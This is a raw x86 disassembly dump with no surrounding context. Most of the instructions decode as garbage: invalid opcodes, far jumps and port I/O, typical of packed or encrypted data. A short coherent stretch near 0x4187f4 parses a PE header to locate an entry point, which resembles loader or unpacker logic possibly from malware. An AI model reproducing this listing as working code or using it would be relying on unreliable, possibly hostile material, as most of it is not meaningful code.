  41856d:	xor    eax,0xd67f97a
  418572:	dec    edi
  418573:	pop    ds
  418574:	xor    eax,0xf498437c
  418579:	popa   
  41857a:	ins    DWORD PTR es:[edi],dx
  41857b:	stos   BYTE PTR es:[edi],al
  41857c:	aam    0x6c
  41857e:	shr    ch,1
  418580:	pop    ss
  418581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418582:	push   edi
  418583:	jnp    0x4185c2
  418585:	cmp    al,0xad
  418587:	cmp    eax,0x4689c694
  41858c:	push   ecx
  41858d:	jns    0x41858b
  41858f:	jmp    0xa3f2:0x41ed2792
  418596:	push   0x231752f0
  41859b:	or     ebx,DWORD PTR [ebx+0x2f0c62c3]
  4185a1:	push   eax
  4185a2:	push   esi
  4185a3:	out    dx,al
  4185a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185a5:	call   0xa39b9c19
  4185aa:	jle    0x4185dd
  4185ac:	fldenv [ecx]
  4185ae:	retf   0xe354
  4185b1:	adc    BYTE PTR [ecx],al
  4185b3:	sub    eax,0x8ec09880
  4185b8:	arpl   WORD PTR [ecx],bp
  4185ba:	jmp    0x4185b2
  4185bc:	fsub   DWORD PTR ds:0x9075b1c6
  4185c2:	iret   
  4185c3:	adc    eax,0x8e736165
  4185c8:	mov    eax,ds:0x2b854e77
  4185cd:	xor    cl,BYTE PTR [edx-0x5e75f5c5]
  4185d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185d4:	push   edi
  4185d5:	xchg   edi,eax
  4185d6:	push   edx
  4185d7:	ja     0x41857b
  4185d9:	inc    ecx
  4185da:	inc    esp
  4185db:	stos   BYTE PTR es:[edi],al
  4185dc:	bound  edx,QWORD PTR [esp]
  4185df:	scas   eax,DWORD PTR es:[edi]
  4185e0:	xchg   esp,eax
  4185e1:	outs   dx,BYTE PTR ds:[esi]
  4185e2:	mov    DWORD PTR [edi-0x11],edi
  4185e5:	push   edx
  4185e6:	jmp    0x27ce3675
  4185eb:	and    eax,0xdc0d089d
  4185f0:	nop
  4185f1:	jg     0x4185da
  4185f3:	xchg   edx,eax
  4185f4:	inc    edi
  4185f5:	in     eax,dx
  4185f6:	pop    ebp
  4185f7:	or     al,0xad
  4185f9:	mov    bh,0x61
  4185fb:	push   eax
  4185fc:	shl    cl,1
  4185fe:	fist   WORD PTR ss:0xad1acfce
  418605:	leave  
  418606:	stos   BYTE PTR es:[edi],al
  418607:	mov    WORD PTR [eax],cs
  418609:	or     BYTE PTR [edx+ecx*2-0x5a08fb2f],al
  418610:	mov    ch,0x98
  418612:	addr16 int3 
  418614:	adc    al,0x8e
  418616:	sub    DWORD PTR [edx],0x4cfbe14a
  41861c:	into   
  41861d:	pusha  
  41861e:	lea    esp,[ecx-0x4a]
  418621:	push   ebx
  418622:	and    al,0xd8
  418624:	cmp    ebp,DWORD PTR [eax-0x4a77677a]
  41862a:	xchg   esi,eax
  41862b:	and    esp,DWORD PTR [ebx]
  41862d:	pop    ebx
  41862e:	xchg   edx,eax
  41862f:	xchg   esp,eax
  418630:	ss pop esi
  418632:	push   ds
  418633:	jp     0x4185fd
  418635:	jne    0x418670
  418637:	inc    esi
  418638:	or     al,BYTE PTR [esi-0x71e9313e]
  41863e:	dec    ebp
  41863f:	js     0x418621
  418641:	xor    DWORD PTR [edx-0x6ad0d6c8],edx
  418647:	cmp    DWORD PTR [eax],esi
  418649:	xchg   esp,eax
  41864a:	inc    esi
  41864b:	mov    dh,0x48
  41864d:	dec    edi
  41864e:	mov    BYTE PTR [ecx],cl
  418650:	es add al,0xc0
  418653:	pop    edi
  418654:	push   edi
  418655:	fbstp  TBYTE PTR [edi+0x7ecc38d1]
  41865b:	test   DWORD PTR fs:[edi+0x67],edi
  41865f:	pop    ebx
  418660:	xchg   ebp,eax
  418661:	mov    ebp,0xce8fa158
  418666:	or     ebp,DWORD PTR [edx]
  418668:	(bad)  
  418669:	ds jmp 0xf0d1:0x5437b465
  418671:	mov    ebx,0xfc200843
  418676:	push   ds
  418677:	dec    BYTE PTR [ecx-0x4b]
  41867a:	daa    
  41867b:	jmp    0x9ebe:0x86e445f7
  418682:	adc    eax,0x235ec3e
  418687:	call   0x43ed:0x995ab468
  41868e:	iret   
  41868f:	add    DWORD PTR [ebp-0x37],edx
  418692:	(bad)  
  418693:	sbb    eax,0xecb69bf8
  418698:	sub    DWORD PTR [eax],0x719c9659
  41869e:	test   bl,al
  4186a0:	push   edx
  4186a1:	ret    0x629e
  4186a4:	push   0xf846b2ec
  4186a9:	popf   
  4186aa:	sub    ch,dl
  4186ac:	sbb    eax,edx
  4186ae:	nop
  4186af:	xchg   esi,eax
  4186b0:	ja     0x4186a0
  4186b2:	dec    esp
  4186b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186b4:	lea    ebx,[eax]
  4186b6:	mov    ah,0x75
  4186b8:	push   ebp
  4186b9:	repz ds dec edi
  4186bc:	push   ebx
  4186bd:	jno    0x4186cf
  4186bf:	mov    ds:0xdd9b9c82,al
  4186c4:	adc    BYTE PTR [esi],0xee
  4186c7:	xchg   ecx,eax
  4186c8:	call   0xfe7d859c
  4186cd:	xor    ch,BYTE PTR [esi+eiz*4-0x13]
  4186d1:	add    dh,BYTE PTR [ecx-0x48cc57d2]
  4186d7:	mov    eax,DWORD PTR [ecx+eax*8]
  4186da:	push   edx
  4186db:	sti    
  4186dc:	test   BYTE PTR [ebx],cl
  4186de:	sub    esp,DWORD PTR [eax+ebp*4+0x44]
  4186e2:	add    edi,DWORD PTR [edx]
  4186e4:	rcl    BYTE PTR [esi-0x4bf45139],1
  4186ea:	lock mov dh,0x8f
  4186ed:	jne    0x4186f4
  4186ef:	and    ch,BYTE PTR [eax+eiz*1]
  4186f2:	repz inc esp
  4186f4:	aaa    
  4186f5:	mov    DWORD PTR [ebx-0x63],ecx
  4186f8:	ins    DWORD PTR es:[edi],dx
  4186f9:	in     al,dx
  4186fa:	cmp    eax,0xb18a939e
  4186ff:	jl     0x41874b
  418701:	sysexit 
  418703:	add    BYTE PTR ds:0x841b0a20,bh
  418709:	iret   
  41870a:	aam    0x2f
  41870c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41870d:	fs je  0x4186db
  418710:	jg     0x4186c6
  418712:	xchg   esi,eax
  418713:	ss (bad) 
  418716:	dec    esp
  418717:	jmp    0xaca80334
  41871c:	sub    BYTE PTR [eax+0x70a2ae5f],al
  418722:	xchg   ebp,ecx
  418724:	shr    DWORD PTR [eax],1
  418726:	mov    gs,WORD PTR [eax-0x337cad13]
  41872c:	ds and eax,0x1f488cd3
  418732:	(bad)  
  418733:	aad    0x7f
  418735:	xchg   ebx,eax
  418736:	or     edi,eax
  418738:	push   edx
  418739:	(bad)  
  41873a:	jmp    0x4186f1
  41873c:	shl    BYTE PTR [ecx+edi*1+0x5a],1
  418740:	fnstenv [ebp+0x6e]
  418743:	(bad)  
  418744:	pop    ds
  418745:	add    dh,BYTE PTR [ecx+0x67]
  418748:	xchg   ebp,eax
  418749:	jge    0x418771
  41874b:	inc    ecx
  41874c:	adc    ah,BYTE PTR [ecx-0x5c]
  41874f:	call   0xda2e17c
  418754:	push   cs
  418755:	ror    DWORD PTR [eax-0xdd0b13a],0x66
  41875c:	sbb    ebp,DWORD PTR [ebp-0x3d]
  41875f:	daa    
  418760:	mov    ?,ebx
  418762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418763:	cdq    
  418764:	les    esp,FWORD PTR [edx+0x32]
  418767:	mov    BYTE PTR [esi-0x1],dh
  41876a:	imul   esi,DWORD PTR [ebp-0x35],0xf2d7c578
  418771:	cdq    
  418772:	cmp    ax,WORD PTR [ebp+0x11]
  418776:	fs pop ebx
  418778:	shl    ch,cl
  41877a:	ror    DWORD PTR [ebp+0x76e8801e],0x26
  418781:	cs jle 0x4187a3
  418784:	pop    es
  418785:	popf   
  418786:	ror    BYTE PTR [ecx-0x6fb1e766],cl
  41878c:	jnp    0x418747
  41878e:	dec    esp
  41878f:	lods   eax,DWORD PTR ds:[esi]
  418790:	pop    edi
  418791:	bound  ecx,QWORD PTR [ebp-0x5d]
  418794:	inc    edx
  418795:	call   0xa350:0xd30d7f1
  41879c:	push   edx
  41879d:	mov    bl,0x3
  41879f:	cdq    
  4187a0:	push   edx
  4187a1:	(bad)
  4187a4:	call   0xb486:0x1bf2c932
  4187ab:	jno    0x4187fa
  4187ad:	and    DWORD PTR [edi+0x6b0f8e9f],esi
  4187b3:	iret   
  4187b4:	daa    
  4187b5:	mov    edi,0x8edf433c
  4187ba:	mov    bh,0xb5
  4187bc:	adc    BYTE PTR [edx+0x30cf6ae5],cl
  4187c2:	mov    ebp,?
  4187c4:	je     0x4187f5
  4187c6:	mov    ebx,0x26354dd5
  4187cb:	out    0x11,al
  4187cd:	loope  0x418838
  4187cf:	or     DWORD PTR [ebx-0x418b5508],esi
  4187d5:	inc    ecx
  4187d6:	sub    BYTE PTR ss:[esi-0x22358ca6],al
  4187dd:	popa   
  4187de:	fst    DWORD PTR [ecx+0x6d]
  4187e1:	jmp    0x32f4a756
  4187e6:	into   
  4187e7:	scas   al,BYTE PTR es:[edi]
  4187e8:	xchg   edi,eax
  4187e9:	in     al,dx
  4187ea:	add    DWORD PTR [ecx-0x3272973f],0x33f18bff
  4187f4:	lock add esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xbe671af2
  41883e:	aas    
  41883f:	xchg   esp,eax
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	popf   
  418849:	mov    ah,0xdd
  41884b:	jne    0x418847
  41884d:	outs   dx,BYTE PTR ds:[esi]
  41884e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41884f:	xchg   esi,eax
  418850:	popf   
  418851:	add    DWORD PTR ds:0x951f02b0,eax
  418857:	es pop es
  418859:	shl    BYTE PTR [ecx],0x82
  41885c:	cs sub esp,esp
  41885f:	cmp    DWORD PTR [esi],esi
  418861:	cmc    
  418862:	sub    DWORD PTR [edx],0x2b
  418865:	psubsw mm5,QWORD PTR es:[esi-0x2b]
  41886a:	mov    cl,0xcd
  41886c:	push   ebx
  41886d:	xchg   esp,eax
  41886e:	push   edx
  41886f:	pop    ds
  418870:	cli    
  418871:	neg    bl
  418873:	stc    
  418874:	sbb    DWORD PTR [eax],ecx
  418876:	push   ds
  418877:	or     al,0x17
  418879:	inc    esp
  41887a:	push   DWORD PTR ds:0x8018809f
  418880:	mov    WORD PTR [ebp-0x2d],cs
  418883:	jnp    0x41885a
  418885:	ror    BYTE PTR [ebp+0x57884193],1
  41888b:	mov    cs,WORD PTR ds:[edx-0x23]
  41888f:	pop    ds
  418890:	adc    BYTE PTR [ecx+0x41ca1860],al
  418896:	or     edx,0xf0b341c7
  41889c:	jg     0x418850
  41889e:	inc    esi
  41889f:	repnz test ch,al
  4188a2:	test   DWORD PTR [si],0x25ea3643
  4188a9:	aad    0x1
  4188ab:	sub    eax,0xaaa18f78
  4188b0:	scas   eax,DWORD PTR es:[edi]
  4188b1:	add    ecx,DWORD PTR [esi+eax*8-0x25]
  4188b5:	imul   edi,eax,0xffffffca
  4188b8:	ror    DWORD PTR [edi+0x50bfbd6f],0xfd
  4188bf:	add    al,0x65
  4188c1:	int3   
  4188c2:	jnp    0x4188a1
  4188c4:	aaa    
  4188c5:	lock sti 
  4188c7:	sbb    eax,DWORD PTR [edi-0xc]
  4188ca:	pushf  
  4188cb:	dec    esi
  4188cc:	retf   0x6493
  4188cf:	xor    ebx,DWORD PTR [ebx-0x40aff3a8]
  4188d5:	shl    BYTE PTR [edx],1
  4188d7:	mov    ds:0x964bf259,eax
  4188dc:	mov    bh,0xa1
  4188de:	ftst   
  4188e0:	add    eax,0x5bc6cd7c
  4188e5:	xor    eax,0x4c7636f5
  4188ea:	mov    ch,0x53
  4188ec:	xchg   edx,eax
  4188ed:	iret   
  4188ee:	(bad)  
  4188f0:	mov    esp,edi
  4188f2:	shr    BYTE PTR [ebx],1
  4188f4:	mov    ds:0x715e2160,eax
  4188f9:	mov    eax,0xa0f574ea
  4188fe:	mov    esp,0x29d88d4c
  418903:	stos   BYTE PTR es:[edi],al
  418904:	fisubr WORD PTR [esi+0x5ab7c7b7]
  41890a:	test   bl,0x25
  41890d:	fstp   TBYTE PTR ss:[esi-0x5c]
  418911:	lds    edi,FWORD PTR [ecx]
  418913:	cld    
  418914:	clc    
  418915:	sub    ebp,DWORD PTR [edx-0x60]
  418918:	in     al,dx
  418919:	retf   
  41891a:	inc    esi
  41891b:	push   ebx
  41891c:	cmp    bh,BYTE PTR [ecx]
  41891e:	(bad)  
  41891f:	mov    ds:0x6301d442,al
  418924:	(bad)  
  418925:	jge    0x418990
  418927:	dec    esi
  418928:	add    eax,0x13f8721f
  41892d:	xchg   edx,eax
  41892e:	or     ah,0xa9
  418931:	stos   DWORD PTR es:[edi],eax
  418932:	xor    DWORD PTR [ebx+0x73],0xffffffec
  418936:	and    dl,BYTE PTR [ecx+0x43fb1888]
  41893c:	mov    cl,0x7b
  41893e:	mov    cl,0xb5
  418940:	popa   
  418941:	xor    edx,DWORD PTR [edi]
  418943:	das    
  418944:	add    DWORD PTR [esi-0x206482f2],ebp
  41894a:	pop    ebp
  41894b:	jg     0x4189bf
  41894d:	and    ebx,DWORD PTR [ecx]
  41894f:	test   eax,0xf9dcb78d
  418954:	es sub eax,0xc32d9845
  41895a:	sub    eax,0xc3213428
  41895f:	adc    eax,0xf77cc9af
  418964:	outs   dx,BYTE PTR ds:[esi]
  418965:	xchg   edx,eax
  418966:	fwait
  418967:	loope  0x418997
  418969:	pop    esi
  41896a:	scas   al,BYTE PTR es:[edi]
  41896b:	(bad)  [ebx-0x2565e7c8]
  418971:	jnp    0x4189af
  418973:	cmp    DWORD PTR ds:[edx+0xc],eax
  418977:	lods   eax,DWORD PTR ds:[esi]
  418978:	cld    
  418979:	das    
  41897a:	lods   eax,DWORD PTR ds:[esi]
  41897b:	mov    eax,DWORD PTR [ebp-0x4]
  41897e:	in     al,dx
  41897f:	pusha  
  418980:	ins    BYTE PTR es:[edi],dx
  418981:	cmp    eax,0x2109acf8
  418986:	xchg   edi,esi
  418988:	dec    edx
  418989:	cmp    al,0xcf
  41898b:	sub    DWORD PTR [ebx+0x28],esi
  41898e:	xor    eax,0x26ded847
  418993:	adc    al,0xe7
  418995:	mov    esi,esp
  418997:	inc    ax
  418999:	xchg   esp,eax
  41899a:	adc    BYTE PTR [bx+di],bl
  41899d:	adc    eax,0x3a23ef89
  4189a2:	cmp    cl,dl
  4189a4:	mov    edi,0xf75ab7be
  4189aa:	add    DWORD PTR [eax*2-0x3fd4ed70],esi
  4189b1:	pop    esp
  4189b2:	neg    bh
  4189b4:	adc    eax,0x274a825c
  4189b9:	lds    ebx,FWORD PTR [eax]
  4189bb:	hlt    
  4189bc:	outs   dx,DWORD PTR ds:[esi]
  4189bd:	in     eax,0xe6
  4189bf:	(bad)  
  4189c0:	pusha  
  4189c1:	daa    
  4189c2:	stos   BYTE PTR es:[edi],al
  4189c3:	js     0x418963
  4189c5:	fdiv   DWORD PTR [edx-0x4b76b8ca]
  4189cb:	fsubrp st(1),st
  4189cd:	jne    0x41898e
  4189cf:	cmp    ebp,0x9c6ce4ce
  4189d5:	call   0x190552f5
  4189da:	shl    DWORD PTR [edx+0x7c14c140],cl
  4189e0:	call   0xbc2bb288
  4189e5:	ins    DWORD PTR es:[edi],dx
  4189e6:	stos   BYTE PTR es:[edi],al
  4189e7:	xor    bl,bh
  4189e9:	cmp    eax,0xda9f5e2a
  4189ee:	les    edi,FWORD PTR [edx+0x30]
  4189f1:	mov    ah,0x4f
  4189f3:	pop    edx
  4189f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f5:	mov    edx,0xd604c1a5
  4189fa:	pop    ecx
  4189fb:	mov    ebp,0x989781ae
  418a00:	(bad)
  418a03:	cwde   
  418a04:	cmc    
  418a05:	jne    0x418a7b
  418a07:	jns    0x418a15
  418a09:	xor    bh,BYTE PTR [ecx+0x26f3014e]
  418a0f:	lods   eax,DWORD PTR ds:[esi]
  418a10:	pop    es
  418a11:	iret   
  418a12:	dec    edi
  418a13:	cli    
  418a14:	jo     0x418a3e
  418a16:	push   ecx
  418a17:	xchg   esp,eax
  418a18:	js     0x418a87
  418a1a:	fs loopne 0x4189a3
  418a1d:	cmc    
  418a1e:	test   eax,0x2b71698f
  418a23:	fidiv  DWORD PTR [ecx]
  418a25:	int    0x79
  418a27:	sti    
  418a28:	mov    WORD PTR [edx],ds
  418a2a:	mov    edi,0xc7443d81
  418a2f:	cmp    edx,DWORD PTR [edi]
  418a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a32:	xor    ch,al
  418a34:	pop    ebp
  418a35:	sti    
  418a36:	arpl   bp,dx
  418a38:	into   
  418a39:	jb     0x418a3e
  418a3b:	cmp    ebx,DWORD PTR [ebx-0xe]
  418a3e:	(bad)  
  418a3f:	push   esi
  418a40:	lods   al,BYTE PTR ds:[esi]
  418a41:	imul   ecx,DWORD PTR [ebx],0xe736c099
  418a47:	add    dl,BYTE PTR [esi-0x518c4113]
  418a4d:	inc    esp
  418a4e:	test   eax,0xdc12277b
  418a53:	les    ebx,FWORD PTR [ebp-0x7a]
  418a56:	(bad)  
  418a58:	pop    ebp
  418a59:	or     al,cl
  418a5b:	mov    WORD PTR [edx+eax*1-0x63],ds
  418a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a60:	xor    dl,BYTE PTR [edx]
  418a62:	in     eax,dx
  418a63:	mov    ebp,0x85ce91bf
  418a68:	stc    
  418a69:	out    0xc7,eax
  418a6b:	xchg   esp,eax
  418a6c:	adc    eax,0x9b0f0a9e
  418a71:	sahf   
  418a72:	loop   0x418a04
  418a74:	fs js  0x418a0f
  418a77:	pop    ecx
  418a78:	mov    ebp,0x2c7e6a6
  418a7d:	adc    al,0x45
  418a7f:	fdivrp st(6),st
  418a81:	mov    eax,0x9560acb0
  418a86:	inc    esp
  418a87:	cli    
  418a88:	jge    0x418aeb
  418a8a:	jne    0x418a4e
  418a8c:	jmp    0xa2623bb4
  418a91:	pop    ds
  418a92:	icebp  
  418a93:	jae    0x418af7
  418a95:	lods   eax,DWORD PTR ds:[esi]
  418a96:	mov    BYTE PTR [ecx-0x6c8af220],al
  418a9c:	fbld   TBYTE PTR [esi+0x6efc6341]
  418aa2:	push   cs
  418aa3:	mov    ecx,0xe5fd9570
  418aa8:	xor    al,0x8f
  418aaa:	in     eax,0x68
  418aac:	xor    ch,BYTE PTR [ebp+0x3b5c241f]
  418ab2:	mov    edx,es
  418ab4:	add    eax,DWORD PTR [eax+0x7c345d8f]
  418aba:	fiadd  WORD PTR [ebx-0x32]
  418abd:	add    al,0x1b
  418abf:	sub    ebp,edx
  418ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ac2:	(bad)  [ebx-0x22d553a4]
  418ac8:	pop    ebx
  418ac9:	into   
  418aca:	addr16 test al,0x8f
  418acd:	inc    edx
  418ace:	dec    ebx
  418acf:	adc    al,0x41
  418ad1:	mov    bh,0xfe
  418ad3:	xchg   ebx,eax
  418ad4:	loope  0x418b3f
  418ad6:	(bad)  
  418ad7:	mov    esi,0x25af732
  418adc:	or     esi,edx
  418ade:	aaa    
  418adf:	sub    eax,0x9b966f9f
  418ae4:	repz lds ecx,FWORD PTR [edx]
  418ae7:	pop    ecx
  418ae8:	(bad)  
  418ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aea:	mov    ebx,0x1aa715d6
  418aef:	jnp    0x418ad0
  418af1:	pop    edx
  418af2:	xchg   DWORD PTR [edi+0xb],edi
  418af5:	in     al,0x57
  418af7:	pop    ebx
  418af8:	mov    al,0xbb
  418afa:	out    0x80,al
  418afc:	dec    ecx
  418afd:	retf   
  418afe:	mov    dh,0x6
  418b00:	adc    edx,DWORD PTR [edx]
  418b02:	leave  
  418b03:	(bad)  
  418b04:	test   DWORD PTR [eax+0x23],0x6d34d552
  418b0b:	and    eax,0x9df49d06
  418b10:	mov    al,ds:0x4e9e3f25
  418b15:	inc    DWORD PTR [ebx]
  418b17:	cwde   
  418b18:	in     eax,dx
  418b19:	cdq    
  418b1a:	push   ecx
  418b1b:	bound  ecx,QWORD PTR [esi+0x10]
  418b1e:	mov    bl,0xc1
  418b20:	pop    esp
  418b21:	adc    eax,0x63e77933
  418b26:	pop    edx
  418b27:	and    BYTE PTR [ebx],0xe6
  418b2a:	push   0xffffff95
  418b2c:	sbb    eax,eax
  418b2e:	(bad)  
  418b2f:	xor    esp,DWORD PTR [ecx]
  418b31:	dec    ebx
  418b32:	mov    bh,0xe6
  418b34:	xchg   ecx,eax
  418b35:	call   0xbeb97513
  418b3a:	mov    dh,0x96
  418b3c:	call   0x7c9e:0xa03914d5
  418b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b44:	add    edi,edi
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	mov    DWORD PTR [esi],eax
  418b64:	adc    BYTE PTR [esi],ch
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	or     ch,dh
  418b70:	or     bh,BYTE PTR [edx+0x2a]
  418b73:	nop
  418b74:	loope  0x418bbf
  418b76:	fs ja  0x418bc1
  418b79:	in     eax,0x65
  418b7b:	retf   0xc975
  418b7e:	xchg   ecx,ebp
  418b80:	imul   ebp,DWORD PTR [ebp+esi*1-0x3b],0xffffffdc
  418b85:	lods   eax,DWORD PTR ds:[esi]
  418b86:	sub    BYTE PTR [esi+edi*2+0x1f887289],cl
  418b8d:	das    
  418b8e:	push   edx
  418b8f:	push   esi
  418b90:	xchg   esp,eax
  418b91:	leave  
  418b92:	lahf   
  418b93:	mov    ah,0xcb
  418b95:	push   ebp
  418b96:	push   ebp
  418b97:	inc    esi
  418b98:	jmp    0x418bc9
  418b9a:	js     0x418b5b
  418b9c:	int3   
  418b9d:	pop    esp
  418b9e:	in     al,dx
  418b9f:	mov    bh,0x97
  418ba1:	ret    0x1cd7
  418ba4:	(bad)  
  418ba5:	mov    edx,0x6bcb4649
  418baa:	jp     0x418c1a
  418bac:	sub    ch,ah
  418bae:	cmp    DWORD PTR [eax-0x5a],0x87771a1a
  418bb5:	iret   
  418bb6:	loop   0x418b48
  418bb8:	cmc    
  418bb9:	sbb    eax,DWORD PTR ds:0xcaef61b8
  418bbf:	sahf   
  418bc0:	arpl   WORD PTR [ebx],si
  418bc2:	call   0xdd2:0x1a1350af
  418bc9:	mov    bh,dl
  418bcb:	adc    al,0xf9
  418bcd:	(bad)
  418bd0:	inc    eax
  418bd1:	adc    BYTE PTR [edi+0x2d9cf4de],al
  418bd7:	jle    0x418c06
  418bd9:	outs   dx,DWORD PTR ds:[esi]
  418bda:	cmovns esp,DWORD PTR [esi+0x6f3d07dd]
  418be1:	shl    DWORD PTR [ebp+ebx*2-0x5a67d836],1
  418be8:	into   
  418be9:	cli    
  418bea:	nop
  418beb:	test   BYTE PTR [edx+0x75],bh
  418bee:	cmp    al,0xaa
  418bf0:	test   eax,0xd2826f38
  418bf5:	sbb    al,0x22
  418bf7:	xchg   edi,eax
  418bf8:	add    eax,0x6e9a2071
  418bfd:	jno    0x418ba9
  418bff:	mov    esp,0x276eb2bd
  418c04:	push   edi
  418c05:	dec    edx
  418c06:	mov    edi,0xa29ee08b
  418c0b:	sub    eax,0xbb243387
  418c10:	stos   BYTE PTR es:[edi],al
  418c11:	sahf   
  418c12:	mov    dl,0x12
  418c14:	pop    ecx
  418c15:	xchg   ecx,eax
  418c16:	push   ebp
  418c17:	imul   DWORD PTR [esi]
  418c19:	mov    ebx,0xd2c4fbd9
  418c1e:	mov    bh,0xe2
  418c20:	imul   edx,DWORD PTR [ebp-0x15],0x60
  418c24:	scas   eax,DWORD PTR es:[edi]
  418c25:	xchg   DWORD PTR [edi+0x5ef2c92b],edi
  418c2b:	mov    al,ds:0x60c4150b
  418c30:	(bad)  
  418c31:	popf   
  418c32:	stos   DWORD PTR es:[edi],eax
  418c33:	inc    ebx
  418c34:	aas    
  418c35:	clc    
  418c36:	mov    ecx,0xd17eb296
  418c3b:	xchg   ebx,ecx
  418c3d:	sub    al,0xd0
  418c40:	or     eax,0x4574632
  418c45:	mov    ebx,DWORD PTR fs:[esi]
  418c48:	cdq    
  418c49:	(bad)  
  418c4b:	dec    eax
  418c4c:	and    al,0xf2
  418c4e:	dec    ebx
  418c4f:	cli    
  418c50:	pop    eax
  418c51:	fsubr  QWORD PTR [ecx-0x35]
  418c54:	call   0x65a6:0x8e8ce36c
  418c5b:	pop    ss
  418c5c:	scas   al,BYTE PTR es:[edi]
  418c5d:	cmp    ah,dl
  418c5f:	push   esi
  418c60:	aad    0x8a
  418c62:	aam    0xb3
  418c64:	dec    ecx
  418c65:	xchg   esp,eax
  418c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c67:	call   0x14be82d2
  418c6c:	mov    edi,0x9a1ed393
  418c71:	stc    
  418c72:	mov    al,ds:0xa5eae0a0
  418c77:	adc    eax,DWORD PTR [eax]
  418c79:	mov    edi,0xa2c9b3ba
  418c7e:	shr    BYTE PTR [eax-0x65],cl
  418c81:	out    dx,al
  418c82:	jne    0x418c17
  418c84:	xor    bh,ah
  418c86:	(bad)  
  418c87:	sub    edi,DWORD PTR [eax+0x173ab47d]
  418c8d:	sbb    BYTE PTR [eax-0x63],al
  418c90:	mov    WORD PTR [edi+0x47],es
  418c93:	sub    al,0x37
  418c95:	dec    eax
  418c96:	js     0x418cce
  418c98:	dec    ebp
  418c99:	stos   BYTE PTR es:[edi],al
  418c9a:	jno    0x418c55
  418c9c:	inc    esi
  418c9d:	mov    edx,DWORD PTR [ebp-0x1781e594]
  418ca3:	lds    eax,FWORD PTR [edi]
  418ca5:	mov    cl,BYTE PTR [eax]
  418ca7:	int    0x6b
  418ca9:	mul    DWORD PTR [edx]
  418cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cac:	stos   DWORD PTR es:[edi],eax
  418cad:	push   edi
  418cae:	(bad)  
  418caf:	mov    WORD PTR [ebx+0x62],fs
  418cb2:	mov    BYTE PTR [ebx-0x6cf161db],ch
  418cb8:	jns    0x418cc3
  418cba:	jo     0x418ca6
  418cbc:	inc    edx
  418cbd:	popf   
  418cbe:	scas   al,BYTE PTR es:[edi]
  418cbf:	pop    edx
  418cc0:	cwde   
  418cc1:	jle    0x418c96
  418cc3:	fs aad 0xaf
  418cc6:	mov    eax,ss
  418cc8:	out    dx,eax
  418cc9:	cdq    
  418cca:	cmp    al,cl
  418ccc:	or     DWORD PTR [ecx-0x3f],eax
  418ccf:	sub    eax,0x6d8dd494
  418cd4:	out    dx,al
  418cd5:	mov    dl,0x82
  418cd7:	mov    WORD PTR [esp+edx*4+0xa7bd0b1],gs
  418cde:	btr    DWORD PTR [ecx-0x379854da],ecx
  418ce5:	add    BYTE PTR [esi],ah
  418ce7:	xor    esi,ecx
  418ce9:	loopne 0x418d5a
  418ceb:	dec    edx
  418cec:	mov    bl,0xab
  418cee:	adc    eax,0xca962e20
  418cf3:	push   eax
  418cf4:	or     BYTE PTR [edx+0x304d52a2],al
  418cfa:	arpl   WORD PTR [ebp-0xf],ax
  418cfd:	pop    edx
  418cfe:	(bad)  
  418cff:	jle    0x418d21
  418d01:	adc    BYTE PTR ss:[ecx+0x7a],bl
  418d05:	lock xchg edx,eax
  418d07:	out    0x9f,eax
  418d09:	pop    edi
  418d0a:	cmp    dl,BYTE PTR [edi-0x146ff716]
  418d10:	and    BYTE PTR [edx+0x65c40a1b],dh
  418d16:	and    BYTE PTR [eax],al
  418d18:	pop    ss
  418d19:	dec    ecx
  418d1a:	and    esi,DWORD PTR [ebp-0x476778b5]
  418d20:	pop    esi
  418d21:	jae    0x418d0e
  418d23:	out    dx,al
  418d24:	pop    esp
  418d25:	jnp    0x418d38
  418d27:	les    esi,FWORD PTR [ebx-0x446a8b28]
  418d2d:	loopne 0x418d33
  418d2f:	mov    ecx,ebp
  418d31:	inc    esp
  418d32:	cli    
  418d33:	or     eax,0x4778dbc8
  418d38:	xchg   esp,eax
  418d39:	xor    dh,cl
  418d3b:	jmp    DWORD PTR [ebp-0x67]
  418d3e:	jecxz  0x418da8
  418d40:	sbb    eax,0x745ec920
